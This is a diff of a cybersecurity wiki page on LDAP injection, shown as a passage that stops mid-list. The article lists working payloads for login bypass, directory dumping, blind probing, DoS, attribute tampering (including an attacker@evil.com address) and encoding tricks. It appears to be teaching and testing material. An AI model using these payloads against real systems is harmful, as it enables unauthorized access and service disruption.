@@ -1,49 +1,72 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en" dir="ltr" data-theme="light">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="LDAP Injection # LDAP Injection is a web application security vulnerability that allows an attacker to manipulate LDAP (Lightweight Directory Access Protocol) queries. This can lead to unauthorized authentication bypass, data exposure, or even full LDAP directory compromise.
-Understanding LDAP Basics # Typical LDAP query
-(filter)(attributes)(scope) Filter: Logical conditions (e.g., (cn=admin))
-Attributes: Fields to retrieve (e.g., cn, mail)
-Scope: Search depth (base, one, sub)
-Base Structure:
-(attribute=value) (&amp;(attribute1=value1)(attribute2=value2)) → AND (|(attribute1=value1)(attribute2=value2)) → OR (!">
-<meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="LDAP Injection" />
-<meta property="og:description" content="LDAP Injection # LDAP Injection is a web application security vulnerability that allows an attacker to manipulate LDAP (Lightweight Directory Access Protocol) queries. This can lead to unauthorized authentication bypass, data exposure, or even full LDAP directory compromise.
-Understanding LDAP Basics # Typical LDAP query
-(filter)(attributes)(scope) Filter: Logical conditions (e.g., (cn=admin))
-Attributes: Fields to retrieve (e.g., cn, mail)
-Scope: Search depth (base, one, sub)
-Base Structure:
-(attribute=value) (&amp;(attribute1=value1)(attribute2=value2)) → AND (|(attribute1=value1)(attribute2=value2)) → OR (!" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/LDAP-Injection/" /><meta property="article:section" content="docs" />
-
-<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
-<title>LDAP Injection | Cyber Security Wiki</title>
-<link rel="manifest" href="/manifest.json">
-<link rel="icon" href="/favicon.png" type="image/x-icon">
-<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
-  <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
-
-  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
-<!--
+  <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
 -->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="LDAP Injection# LDAP Injection is a web application security vulnerability that allows an attacker to manipulate LDAP (Lightweight Directory Access Protocol) queries. This can lead to unauthorized authentication bypass, data exposure, or even full LDAP directory compromise.
+Understanding LDAP Basics# Typical LDAP query
+(filter)(attributes)(scope)Filter: Logical conditions (e.g., (cn=admin))
+Attributes: Fields to retrieve (e.g., cn, mail)
+Scope: Search depth (base, one, sub)
+Base Structure:
+(attribute=value) (&amp;(attribute1=value1)(attribute2=value2)) → AND (|(attribute1=value1)(attribute2=value2)) → OR (!...) → NOT Common Attributes:
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/LDAP-Injection/">
+	<meta property="og:site_name" content="Cyber Security Wiki">
+	<meta property="og:title" content="LDAP Injection">
+	<meta property="og:description" content="LDAP Injection# LDAP Injection is a web application security vulnerability that allows an attacker to manipulate LDAP (Lightweight Directory Access Protocol) queries. This can lead to unauthorized authentication bypass, data exposure, or even full LDAP directory compromise.
+Understanding LDAP Basics# Typical LDAP query
+(filter)(attributes)(scope)Filter: Logical conditions (e.g., (cn=admin))
+Attributes: Fields to retrieve (e.g., cn, mail)
+Scope: Search depth (base, one, sub)
+Base Structure:
+(attribute=value) (&amp;(attribute1=value1)(attribute2=value2)) → AND (|(attribute1=value1)(attribute2=value2)) → OR (!...) → NOT Common Attributes:">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30">
+
+
+	<meta itemprop="name" content="LDAP Injection">
+	<meta itemprop="description" content="LDAP Injection# LDAP Injection is a web application security vulnerability that allows an attacker to manipulate LDAP (Lightweight Directory Access Protocol) queries. This can lead to unauthorized authentication bypass, data exposure, or even full LDAP directory compromise.
+Understanding LDAP Basics# Typical LDAP query
+(filter)(attributes)(scope)Filter: Logical conditions (e.g., (cn=admin))
+Attributes: Fields to retrieve (e.g., cn, mail)
+Scope: Search depth (base, one, sub)
+Base Structure:
+(attribute=value) (&amp;(attribute1=value1)(attribute2=value2)) → AND (|(attribute1=value1)(attribute2=value2)) → OR (!...) → NOT Common Attributes:">
+	<meta itemprop="dateModified" content="2026-08-05T21:53:05+05:30">
+	<meta itemprop="wordCount" content="1410">
+
+<title>LDAP Injection • Cyber Security Wiki</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="https://cyber-security.wiki/docs/application-security/web/LDAP-Injection/">
+<link rel="stylesheet" href="/book.min.4d77e98d764f495b145946ef9260681bab38aaf7bc01f96a6f61a3a0fea19dbf.css" integrity="sha256-TXfpjXZPSVsUWUbvkmBoG6s4qve8Aflqb2GjoP6hnb8=" crossorigin="anonymous">
+
+
+
+  <script defer type="module" src="/en.search.min.07d8a67671a2c683431c7034b07b0f4b6c6daae7a9c289fde2e3663a9ff4e6c5.js" integrity="sha256-B9imdnGixoNDHHA0sHsPS2xtquepwon94uNmOp/05sU=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
   
 </head>
-<body dir="ltr">
+<body dir="ltr" class="book-kind-page book-type-docs">
   <input type="checkbox" class="hidden toggle" id="menu-control" />
   <input type="checkbox" class="hidden toggle" id="toc-control" />
   <main class="container flex">
-    <aside class="book-menu">
-      <div class="book-menu-content">
-        
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
   <nav>
 <h2 class="book-brand">
   <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
@@ -51,11 +74,15 @@ https://github.com/alex-shpak/hugo-book
 </h2>
 
 
-<div class="book-search">
-  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
   <div class="book-search-spinner hidden"></div>
   <ul id="book-search-results"></ul>
 </div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
 
 
 
@@ -66,9 +93,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-
-
-  
 
 
 
@@ -83,8 +107,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
-    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-1f4bf90b10ddb9d04537ec779b672afa" class="toggle" checked />
+    <label for="section-1f4bf90b10ddb9d04537ec779b672afa" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Application Security</a>
     </label>
   
@@ -100,8 +124,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
-    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-97ce584ed7ffb43a07e43ad9f5889c71" class="toggle"  />
+    <label for="section-97ce584ed7ffb43a07e43ad9f5889c71" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Thick Client</a>
     </label>
   
@@ -187,8 +211,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
-    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-26c356cfc062017e944cd67af2378245" class="toggle"  />
+    <label for="section-26c356cfc062017e944cd67af2378245" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Vulnerable Applications</a>
     </label>
   
@@ -235,8 +259,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
-    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-db0925704b156fffd3db5c66cb42d41d" class="toggle" checked />
+    <label for="section-db0925704b156fffd3db5c66cb42d41d" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Web</a>
     </label>
   
@@ -990,8 +1014,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
-    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="toggle"  />
+    <label for="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Cloud Security</a>
     </label>
   
@@ -1012,8 +1036,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
-    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5ef99b8721144773b97f7bfef900362b" class="toggle"  />
+    <label for="section-5ef99b8721144773b97f7bfef900362b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">DevSecOps</a>
     </label>
   
@@ -1034,8 +1058,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
-    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="toggle"  />
+    <label for="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Exploit Development</a>
     </label>
   
@@ -1056,8 +1080,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
-    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-2aeefa6ddff0a8e5db97003607c446af" class="toggle"  />
+    <label for="section-2aeefa6ddff0a8e5db97003607c446af" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">IoT Security</a>
     </label>
   
@@ -1078,8 +1102,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
-    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-150b068623f422b911e0c10751e41d4b" class="toggle"  />
+    <label for="section-150b068623f422b911e0c10751e41d4b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Machine Learning</a>
     </label>
   
@@ -1113,8 +1137,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
-    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5d1d2284d8b625a6ff29beaf70c29606" class="toggle"  />
+    <label for="section-5d1d2284d8b625a6ff29beaf70c29606" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Network</a>
     </label>
   
@@ -1135,8 +1159,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
-    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="toggle"  />
+    <label for="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Red Teaming</a>
     </label>
   
@@ -1157,8 +1181,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
-    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-48d01542c459fd722a2e871cc9bbd985" class="toggle"  />
+    <label for="section-48d01542c459fd722a2e871cc9bbd985" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Threat Modelling</a>
     </label>
   
@@ -1179,35 +1203,13 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-<hr>
-<b>
 
-
-  
-<ul>
-  
-  <li>
-    <a href="/contribute/" >
-        Contribute
-      </a>
-  </li>
-  
-  <li>
-    <a href="https://securecode.wiki" target="_blank" rel="noopener">
-        Secure Code Wiki by Payatu
-      </a>
-  </li>
-  
-</ul>
+<ul><li><a href="/contribute/" title="Contribute">contribute</a></li><li><a href="https://securecode.wiki" target="_blank" rel="noopener">Secure Code Wiki by Payatu</a></li></ul>
 
 
 
 
-
-
-</b>
 </nav>
-
 
 
 
@@ -1215,30 +1217,31 @@ https://github.com/alex-shpak/hugo-book
   <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
 
 
+
+  </div>
+</aside>
  
-      </div>
-    </aside>
 
     <div class="book-page">
-      <header class="book-header">
+      <header class="book-header hidden">
         
   <div class="flex align-center justify-between">
   <label for="menu-control">
-    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>LDAP Injection</strong>
+  <h3>LDAP Injection</h3>
 
   <label for="toc-control">
     
-    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
     
   </label>
 </div>
 
 
   
-  <aside class="hidden clearfix">
+  <aside class="hidden">
     
   
 <nav id="TableOfContents">
@@ -1335,21 +1338,14 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="ldap-injection">
-  LDAP Injection
-  <a class="anchor" href="#ldap-injection">#</a>
-</h1>
+  <article class="markdown book-article"><h1 id="ldap-injection">LDAP Injection<a class="anchor" href="#ldap-injection">#</a></h1>
 <p><strong>LDAP Injection</strong> is a web application security vulnerability that allows an attacker to manipulate LDAP (Lightweight Directory Access Protocol) queries. This can lead to unauthorized authentication bypass, data exposure, or even full LDAP directory compromise.</p>
 <hr>
-<h2 id="understanding-ldap-basics">
-  Understanding LDAP Basics
-  <a class="anchor" href="#understanding-ldap-basics">#</a>
-</h2>
+<h2 id="understanding-ldap-basics">Understanding LDAP Basics<a class="anchor" href="#understanding-ldap-basics">#</a></h2>
 <ul>
 <li>
 <p>Typical LDAP query</p>
-<pre tabindex="0"><code>(filter)(attributes)(scope)
-</code></pre><p><strong>Filter</strong>: Logical conditions (e.g., <strong><code>(cn=admin)</code></strong>)</p>
+<pre tabindex="0"><code>(filter)(attributes)(scope)</code></pre><p><strong>Filter</strong>: Logical conditions (e.g., <strong><code>(cn=admin)</code></strong>)</p>
 <p><strong>Attributes</strong>: Fields to retrieve (e.g., <strong><code>cn, mail</code></strong>)</p>
 <p><strong>Scope</strong>: Search depth (<strong><code>base</code></strong>, <strong><code>one</code></strong>, <strong><code>sub</code></strong>)</p>
 </li>
@@ -1358,8 +1354,7 @@ https://github.com/alex-shpak/hugo-book
 <pre tabindex="0"><code>(attribute=value)
 (&amp;(attribute1=value1)(attribute2=value2))  → AND
 (|(attribute1=value1)(attribute2=value2))  → OR
-(!...)                                      → NOT
-</code></pre></li>
+(!...)                                      → NOT</code></pre></li>
 <li>
 <p><strong>Common Attributes:</strong></p>
 <ul>
@@ -1371,13 +1366,9 @@ https://github.com/alex-shpak/hugo-book
 <pre tabindex="0"><code>*)(&amp;
 *))(|(
 admin)(&amp;)
-(|(cn=*)
-</code></pre></li>
+(|(cn=*)</code></pre></li>
 </ul>
-<h3 id="requirements">
-  Requirements
-  <a class="anchor" href="#requirements">#</a>
-</h3>
+<h3 id="requirements">Requirements<a class="anchor" href="#requirements">#</a></h3>
 <p>LDAP Injection is generally possible when:</p>
 <ul>
 <li>User input is directly concatenated into LDAP filters.</li>
@@ -1386,72 +1377,63 @@ admin)(&amp;)
 <li>The application performs authentication or directory lookups using LDAP.</li>
 <li>Anonymous bind or over-privileged bind accounts are configured.</li>
 </ul>
-<h3 id="ldap-search-scopes">
-  LDAP Search Scopes
-  <a class="anchor" href="#ldap-search-scopes">#</a>
-</h3>
+<h3 id="ldap-search-scopes">LDAP Search Scopes<a class="anchor" href="#ldap-search-scopes">#</a></h3>
 <table>
-<thead>
-<tr>
-<th>Scope</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Base</td>
-<td>Search only the specified object</td>
-</tr>
-<tr>
-<td>One</td>
-<td>Search immediate child objects</td>
-</tr>
-<tr>
-<td>Sub</td>
-<td>Search the entire subtree</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Scope</th>
+					<th>Description</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Base</td>
+					<td>Search only the specified object</td>
+			</tr>
+			<tr>
+					<td>One</td>
+					<td>Search immediate child objects</td>
+			</tr>
+			<tr>
+					<td>Sub</td>
+					<td>Search the entire subtree</td>
+			</tr>
+	</tbody>
 </table>
 <hr>
-<h3 id="common-ldap-operators">
-  Common LDAP Operators
-  <a class="anchor" href="#common-ldap-operators">#</a>
-</h3>
+<h3 id="common-ldap-operators">Common LDAP Operators<a class="anchor" href="#common-ldap-operators">#</a></h3>
 <table>
-<thead>
-<tr>
-<th>Operator</th>
-<th>Meaning</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>&amp;</code></td>
-<td>AND</td>
-</tr>
-<tr>
-<td>`</td>
-<td>`</td>
-</tr>
-<tr>
-<td><code>!</code></td>
-<td>NOT</td>
-</tr>
-<tr>
-<td><code>*</code></td>
-<td>Wildcard</td>
-</tr>
-<tr>
-<td><code>()</code></td>
-<td>Grouping</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Operator</th>
+					<th>Meaning</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><code>&amp;</code></td>
+					<td>AND</td>
+			</tr>
+			<tr>
+					<td>`</td>
+					<td>`</td>
+			</tr>
+			<tr>
+					<td><code>!</code></td>
+					<td>NOT</td>
+			</tr>
+			<tr>
+					<td><code>*</code></td>
+					<td>Wildcard</td>
+			</tr>
+			<tr>
+					<td><code>()</code></td>
+					<td>Grouping</td>
+			</tr>
+	</tbody>
 </table>
 <hr>
-<h2 id="ldap-injection-attack-surface">
-  LDAP Injection Attack Surface
-  <a class="anchor" href="#ldap-injection-attack-surface">#</a>
-</h2>
+<h2 id="ldap-injection-attack-surface">LDAP Injection Attack Surface<a class="anchor" href="#ldap-injection-attack-surface">#</a></h2>
 <ul>
 <li>Login Forms</li>
 <li>Search Boxes</li>
@@ -1468,258 +1450,183 @@ admin)(&amp;)
 <li>Active Directory management panels</li>
 </ul>
 <hr>
-<h2 id="exploiting-ldap-injection">
-  Exploiting LDAP Injection
-  <a class="anchor" href="#exploiting-ldap-injection">#</a>
-</h2>
-<h3 id="1-authentication-bypass">
-  1. <strong>Authentication Bypass</strong>
-  <a class="anchor" href="#1-authentication-bypass">#</a>
-</h3>
+<h2 id="exploiting-ldap-injection">Exploiting LDAP Injection<a class="anchor" href="#exploiting-ldap-injection">#</a></h2>
+<h3 id="1-authentication-bypass">1. <strong>Authentication Bypass</strong><a class="anchor" href="#1-authentication-bypass">#</a></h3>
 <p>Assume the query:</p>
-<pre tabindex="0"><code>(&amp;(uid={input})(userPassword={input}))
-</code></pre><p>Payloads:</p>
+<pre tabindex="0"><code>(&amp;(uid={input})(userPassword={input}))</code></pre><p>Payloads:</p>
 <pre tabindex="0"><code>*)(&amp;                        // Closes password field, starts new AND group
 *)(userPassword=*)          // Wildcard uid + match any password
 admin*)(userPassword=*      // Target admin accounts + bypass password
 admin)(|(userPassword=*)    // Admin user + OR logic for any password
-*)(uid=*))(|(uid=*          // Match any user + break filter with nested OR
-</code></pre><p><code>These payloads break out of the intended LDAP filter structure by injecting  operators and wildcards, creating conditions that always evaluate to true and  bypass authentication without valid credentials.</code></p>
+*)(uid=*))(|(uid=*          // Match any user + break filter with nested OR</code></pre><p><code>These payloads break out of the intended LDAP filter structure by injecting  operators and wildcards, creating conditions that always evaluate to true and  bypass authentication without valid credentials.</code></p>
 <p>Example:</p>
 <pre tabindex="0"><code>Username: admin*)(userPassword=*
-Password: anything
-</code></pre><h3 id="2-bypass-with-wildcards">
-  2. <strong>Bypass with Wildcards</strong>
-  <a class="anchor" href="#2-bypass-with-wildcards">#</a>
-</h3>
+Password: anything</code></pre><h3 id="2-bypass-with-wildcards">2. <strong>Bypass with Wildcards</strong><a class="anchor" href="#2-bypass-with-wildcards">#</a></h3>
 <pre tabindex="0"><code>*)(cn=*)                    // Break out + match any common name attribute
 *(|(mail=*))                // Wildcard + OR logic to match any email
-*))                         // Close multiple conditions, match everything
-</code></pre><p><code>These use wildcards (*) to match any value and break out of the original filter, returning all LDAP entries or bypassing authentication checks.</code></p>
-<h3 id="3-blind-injection-payloads">
-  3. <strong>Blind Injection Payloads</strong>
-  <a class="anchor" href="#3-blind-injection-payloads">#</a>
-</h3>
+*))                         // Close multiple conditions, match everything</code></pre><p><code>These use wildcards (*) to match any value and break out of the original filter, returning all LDAP entries or bypassing authentication checks.</code></p>
+<h3 id="3-blind-injection-payloads">3. <strong>Blind Injection Payloads</strong><a class="anchor" href="#3-blind-injection-payloads">#</a></h3>
 <p>Test logical behavior changes:</p>
 <pre tabindex="0"><code>*)(uid=admin))(|(uid=*      // Check if admin exists via OR bypass
 *)(uid=admin))(|(uid=*)     // Alternative format for admin check
-*)(!(uid=admin))x           // Negation logic - inverts admin condition
-</code></pre><p><code>If one version allows access while another denies → vulnerable.</code></p>
-<h3 id="4-denial-of-service-dos">
-  <strong>4. Denial of Service (DoS)</strong>
-  <a class="anchor" href="#4-denial-of-service-dos">#</a>
-</h3>
+*)(!(uid=admin))x           // Negation logic - inverts admin condition</code></pre><p><code>If one version allows access while another denies → vulnerable.</code></p>
+<h3 id="4-denial-of-service-dos"><strong>4. Denial of Service (DoS)</strong><a class="anchor" href="#4-denial-of-service-dos">#</a></h3>
 <p>Crash LDAP server with complex queries:</p>
 <pre tabindex="0"><code>*)(|(objectClass=*)(cn=*)(ou=*)(dc=*)(sn=*)(givenName=*)(mail=*)(telephoneNumber=*)(&amp;
     // Massive OR chain + unclosed AND - resource exhaustion
 (&amp;(objectClass=*)(!(objectClass=void)))
-    // Contradictory logic - match all then exclude all
-</code></pre><h3 id="5-ldap-attribute-injection">
-  <strong>5. LDAP Attribute Injection</strong>
-  <a class="anchor" href="#5-ldap-attribute-injection">#</a>
-</h3>
+    // Contradictory logic - match all then exclude all</code></pre><h3 id="5-ldap-attribute-injection"><strong>5. LDAP Attribute Injection</strong><a class="anchor" href="#5-ldap-attribute-injection">#</a></h3>
 <p>Modify attributes in LDAP entries:</p>
 <pre tabindex="0"><code>*)(userPassword=HASHED_PASS)(uid=*    // Inject password hash for any user
-*)(|(mail=attacker@evil.com)(uid=*    // Change email via OR injection
-</code></pre><p><strong>Example:</strong></p>
+*)(|(mail=attacker@evil.com)(uid=*    // Change email via OR injection</code></pre><p><strong>Example:</strong></p>
 <p>If an application allows profile updates:</p>
 <pre tabindex="0"><code>Original: (&amp;(uid=user)(mail=legit@test.com))
-Injected: (&amp;(uid=user)(mail=attacker@evil.com))
-</code></pre><h3 id="6-escalating-privileges-of-a-user">
-  6. Escalating Privileges of a user
-  <a class="anchor" href="#6-escalating-privileges-of-a-user">#</a>
-</h3>
+Injected: (&amp;(uid=user)(mail=attacker@evil.com))</code></pre><h3 id="6-escalating-privileges-of-a-user">6. Escalating Privileges of a user<a class="anchor" href="#6-escalating-privileges-of-a-user">#</a></h3>
 <p>Elevate user permissions:</p>
 <pre tabindex="0"><code>Information)(security_level=*))(&amp;(directory=documents
     // Break filter + match any security level
     
 Injected Query:
-(&amp;(directory=Information)(security_level=*))(&amp;(directory=Information)(security_level=low))
-</code></pre><h3 id="7-blind-ldap-injection-techniques">
-  7. Blind LDAP Injection Techniques
-  <a class="anchor" href="#7-blind-ldap-injection-techniques">#</a>
-</h3>
+(&amp;(directory=Information)(security_level=*))(&amp;(directory=Information)(security_level=low))</code></pre><h3 id="7-blind-ldap-injection-techniques">7. Blind LDAP Injection Techniques<a class="anchor" href="#7-blind-ldap-injection-techniques">#</a></h3>
 <p><strong>Payloads:</strong></p>
 <pre tabindex="0"><code>*)(uid=admin))(|(uid=*      // Boolean: different response = admin exists
 *)(!(uid=guest))            // Negation: check if guest is filtered
-*)(delay=5000))             // Time-based: response after 5 seconds (like SQL injection)
-</code></pre><p>Detection Methods:</p>
+*)(delay=5000))             // Time-based: response after 5 seconds (like SQL injection)</code></pre><p>Detection Methods:</p>
 <ul>
 <li>Boolean-based: Observe different responses (access granted/denied, error messages)</li>
 <li>Time-based: Measure response delays to confirm query execution</li>
 <li>Content-based: Analyze differences in returned data or page length</li>
 </ul>
 <hr>
-<h2 id="test-cases">
-  Test Cases
-  <a class="anchor" href="#test-cases">#</a>
-</h2>
+<h2 id="test-cases">Test Cases<a class="anchor" href="#test-cases">#</a></h2>
 <table>
-<thead>
-<tr>
-<th>Scenario</th>
-<th>Payload</th>
-<th>Expected Outcome</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Bypass Login</td>
-<td><code>admin*)(userPassword=*</code></td>
-<td>Authenticated as &ldquo;admin&rdquo;</td>
-</tr>
-<tr>
-<td>Extract all entries</td>
-<td><code>*)(cn=*)</code></td>
-<td>Lists all entries</td>
-</tr>
-<tr>
-<td>Filter manipulation</td>
-<td>`<em>)(uid=</em>))(</td>
-<td>(uid=*`</td>
-</tr>
-<tr>
-<td>Force true</td>
-<td>`<em>)(uid=</em>))(</td>
-<td>(objectClass=*))`</td>
-</tr>
-<tr>
-<td>Negate a condition</td>
-<td><code>*)(!(uid=admin))</code></td>
-<td>Admin filtered out</td>
-</tr>
-<tr>
-<td>Break out of original query</td>
-<td><code>*)(&amp;</code> or `*)</td>
-<td>(`</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Scenario</th>
+					<th>Payload</th>
+					<th>Expected Outcome</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Bypass Login</td>
+					<td><code>admin*)(userPassword=*</code></td>
+					<td>Authenticated as &ldquo;admin&rdquo;</td>
+			</tr>
+			<tr>
+					<td>Extract all entries</td>
+					<td><code>*)(cn=*)</code></td>
+					<td>Lists all entries</td>
+			</tr>
+			<tr>
+					<td>Filter manipulation</td>
+					<td>`<em>)(uid=</em>))(</td>
+					<td>(uid=*`</td>
+			</tr>
+			<tr>
+					<td>Force true</td>
+					<td>`<em>)(uid=</em>))(</td>
+					<td>(objectClass=*))`</td>
+			</tr>
+			<tr>
+					<td>Negate a condition</td>
+					<td><code>*)(!(uid=admin))</code></td>
+					<td>Admin filtered out</td>
+			</tr>
+			<tr>
+					<td>Break out of original query</td>
+					<td><code>*)(&amp;</code> or `*)</td>
+					<td>(`</td>
+			</tr>
+	</tbody>
 </table>
 <hr>
-<h2 id="ldap-injection-bypasses--obfuscation">
-  LDAP Injection Bypasses &amp; Obfuscation
-  <a class="anchor" href="#ldap-injection-bypasses--obfuscation">#</a>
-</h2>
+<h2 id="ldap-injection-bypasses--obfuscation">LDAP Injection Bypasses &amp; Obfuscation<a class="anchor" href="#ldap-injection-bypasses--obfuscation">#</a></h2>
 <ul>
 <li>
 <p><strong>Encoded Payloads:</strong></p>
-<pre tabindex="0"><code>%2A%29%28userPassword%3D%2A
-</code></pre></li>
+<pre tabindex="0"><code>%2A%29%28userPassword%3D%2A</code></pre></li>
 <li>
 <p><strong>Case variations:</strong> <code>(uID=admin)</code> instead of <code>(uid=admin)</code></p>
 </li>
 <li>
 <p><strong>Nested filters</strong>:</p>
-<pre tabindex="0"><code>(&amp;(uid=admin)(!(uid=*)))
-</code></pre></li>
+<pre tabindex="0"><code>(&amp;(uid=admin)(!(uid=*)))</code></pre></li>
 <li>
